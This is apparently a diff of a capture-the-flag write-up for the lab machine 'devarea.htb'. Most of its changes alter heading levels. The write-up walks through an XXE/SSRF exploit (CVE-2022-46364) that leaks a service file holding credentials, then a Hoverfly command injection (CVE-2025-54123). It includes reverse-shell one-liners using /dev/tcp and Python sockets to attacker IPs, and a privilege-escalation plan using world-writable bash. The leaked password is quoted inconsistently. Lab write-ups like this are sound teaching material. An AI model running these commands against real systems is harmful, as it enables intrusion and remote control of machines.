@@ -30,6 +30,7 @@ Machine Overview
 ================================
 
 The first step is always reconnaissance. I started with a full Nmap scan to map out the attack surface:
+## **SCAN**
 
 ``` 
 nmap -nmap -sV -sC -p- --min-rate=10000 -vv 10.129.58.32 
@@ -47,7 +48,7 @@ nmap -nmap -sV -sC -p- --min-rate=10000 -vv 10.129.58.32
 *   **Port 8888 (Hoverfly):** Exposed dashboard.
     
 
-### **1.1 FTP Enumeration**
+## **1.1 FTP Enumeration**
 
 Since **Anonymous login** was permitted, I immediately jumped into the FTP server to see what I could exfiltrate:
 
@@ -56,7 +57,7 @@ Since **Anonymous login** was permitted, I immediately jumped into the FTP serve
 
 ```   
 
-### **1.2 Static Analysis (JAR Decompilation)**
+## **1.2 Static Analysis (JAR Decompilation)**
 
 To understand the backend logic, I used jadx-gui to decompile the retrieved JAR file. Inside ServerStarter.java, I identified the use of **Apache CXF JAX-WS**.
 
@@ -78,7 +79,7 @@ After identifying the tech stack through static analysis of the employee-service
 
 **FindingImplicationApache CXF JAX-WS**A robust but complex SOAP framework that handles sensitive XML/SOAP data.**Jetty 9.4.27**A legacy web server (released circa 2020) known to have unpatched security gaps.**Endpoint: /employeeservice**The exposed API surface where SOAP requests are processed.**WSDL Access**Full visibility into the service structure, allowing for precise payload crafting.
 
-### **Exploit : CVE-2022-46364**
+## **Exploit : CVE-2022-46364**
 
 My research led me to **CVE-2022-46364**, a high-severity vulnerability that perfectly matched the target's environment.
 
@@ -99,7 +100,7 @@ To weaponize this, I utilized a specialized Python exploit script:
 
 I used the identified PoC to confirm the **XXE-to-SSRF** flaw. My primary objective was to confirm the vulnerability and map out the system users to find a path for lateral movement.
 
-**Proof of Concept (PoC):**I targeted the /etc/passwd file to verify my ability to read arbitrary files from the server.
+## **Proof of Concept (PoC):**I targeted the /etc/passwd file to verify my ability to read arbitrary files from the server.
   ```
 
   # Executing the XXE exploit to leak /etc/passwd  python3 CVE-2022-46364.py -t  -s file:///etc/passwd -d devarea.htb   
@@ -129,18 +130,18 @@ In modern Linux environments, services are typically managed by systemd. These s
 *   **Operational Efficiency**: Instead of brute-forcing a dashboard, we go straight to the "Source of Truth" stored on the disk.
     
 
-### I leveraged the **CVE-2022-46364** exploit to exfiltrate this unit file.
+## I leveraged the **CVE-2022-46364** exploit to exfiltrate this unit file.
    ```
    python3 CVE-2022-46364.py \\    -t  \\    -s file:///etc/systemd/system/hoverfly.service \\    -d devarea.htb   
    ```
 
-### Exfiltrated Configuration:
+## Exfiltrated Configuration:
 
 ```
 nano ~/Desktop ❯ python3 CVE-2022-46364.py \\         -t  \\    -s file:///etc/systemd/system/hoverfly.service \\    -d devarea.htb   ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗      ██╗  ██╗ ██████╗ ██████╗  ██████╗ ██╗  ██╗  ██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗     ██║  ██║██╔════╝ ╚════██╗██╔════╝ ██║  ██║  ██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝     ███████║███████╗  █████╔╝███████╗ ███████║  ██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗     ╚════██║██╔═══██╗██╔═══╝ ██╔═══██╗╚════██║  ╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝          ██║╚██████╔╝███████╗╚██████╔╝     ██║   ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝           ╚═╝ ╚═════╝ ╚══════╝ ╚═════╝      ╚═╝  ======================================================================    CVE-2022-46364 | Apache CXF SSRF via MTOM XOP:Include    CVSS 9.8 CRITICAL | CWE-918  ======================================================================  [CONFIG]    Target:       SSRF URL: file:///etc/systemd/system/hoverfly.service    Domain:   devarea.htb    Method:   MTOM  [*] Sending exploit payload...  [+] Server responded: HTTP 200  [RAW RESPONSE SNIPPET]  Report received from W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUK  [BASE64 EXTRACTED]  W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZs...  [EXFILTRATED CONTENT]  ======================================================================  [Unit]  Description=HoverFly service  After=network.target  [Service]  User=dev_ryan  Group=dev_ryan  WorkingDirectory=/opt/HoverFly  ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0  Restart=on-failure  RestartSec=5  StartLimitIntervalSec=60  StartLimitBurst=5  LimitNOFILE=65536  StandardOutput=journal  StandardError=journal  [Install]  WantedBy=multi-user.target  ======================================================================  [✓] EXPLOIT SUCCESSFUL  Server fetched internal resource and returned contents.  
 ```
 
-**Credentials I get it:** admin:07IJ327MyyXiU for Hoverfly Dashboard!
+## **Credentials I get it:** admin:07IJ327MyyXiU for Hoverfly Dashboard!
 
 *   **Username:** admin
     
@@ -159,7 +160,7 @@ nano ~/Desktop ❯ python3 CVE-2022-46364.py \\         -t  \\    -s file:///etc
 
 Having secured the credentials, I researched potential vulnerabilities for the Hoverfly instance. My investigation led to **CVE-2025-54123**, a critical **Command Injection** flaw.
 
-### **Vulnerability Breakdown: CVE-2025-54123**
+## **Vulnerability Breakdown: CVE-2025-54123**
 
 *   **Target Endpoint**: /api/v2/hoverfly/middleware
     
@@ -177,7 +178,7 @@ Having secured the credentials, I researched potential vulnerabilities for the H
 
 With the administrative credentials admin:O7IJ27MyyXiU in hand, I moved to exploit the **Hoverfly Middleware Command Injection** vulnerability. As identified in the research phase, this flaw allows for direct command execution through the middleware API.
 
-### **Step 1: Verification**
+## **Step 1: Verification**
 
 I first executed a simple whoami command to verify the execution environment and ensure the credentials were valid.
 
@@ -191,7 +192,7 @@ python3 CVE-2025-54123.py \\    -u admin \\    -p O7IJ27MyyXiU \\    -c "whoami"
    ```
 
 
-### **Step 2: Spawning a Reverse Shell**
+## **Step 2: Spawning a Reverse Shell**
 
 After confirming command execution, I set up a Netcat listener on my local machine to catch the incoming connection:
 
@@ -208,7 +209,7 @@ Then, I executed the exploit again, this time targeting a full reverse shell pay
  nano ~ ❯ python3 CVE-2025-54123.py \\    -u admin \\    -p O7IJ27MyyXiU \\    -c "sh -i >& /dev/tcp/10.10.14.215/9001 0>&1" \\    -t
  ```
 
-**Connection Received:**
+## **Connection Received:**
 
 ```
  connect to [10.10.15.9] from (UNKNOWN) [10.129.58.32] 54322  dev_ryan@devarea:~$   
@@ -246,7 +247,7 @@ After securing a foothold as **dev\_ryan**, I began my internal enumeration. Che
 ```
 I discovered that dev\_ryan can execute /opt/syswatch/syswatch.sh as **root** without a password. Upon inspecting the environment, I found a critical misconfiguration that turned this "limited" script into a full system compromise.
 
-### **The Critical Discovery**
+## **The Critical Discovery**
 
 Checking the permissions of the system's bash binary revealed a shocking security flaw:
 
@@ -260,23 +261,23 @@ Output: -rwxrwxrwx 1 root root 1396520 ... /usr/bin/bash\
 
 The /usr/bin/bash binary was **world-writable**. This means any user on the system can modify or replace the core shell binary.
 
-### **Step 1: Setting Up a Clean Shell**
+## **Step 1: Setting Up a Clean Shell**
 
 Our current reverse shell is bash-based. If we overwrite or kill the bash process, we lose our connection. I established a secondary "clean" shell using /bin/sh to maintain persistence.
 
-**On Kali (Second Listener):**
+## **On Kali (Second Listener):**
 
 ```
   nc -lvnp 5332   
 ```
 
-**From the existing shell:**
+## **From the existing shell:**
 
 ```
    python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.15.9",5332));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'   
 ```
 
-### **Step 2: Crafting the Malicious Payload**
+## **Step 2: Crafting the Malicious Payload**
 
 I backed up the original bash binary and created a script that would grant me permanent root access by setting the **SUID** bit on Python 3.
 
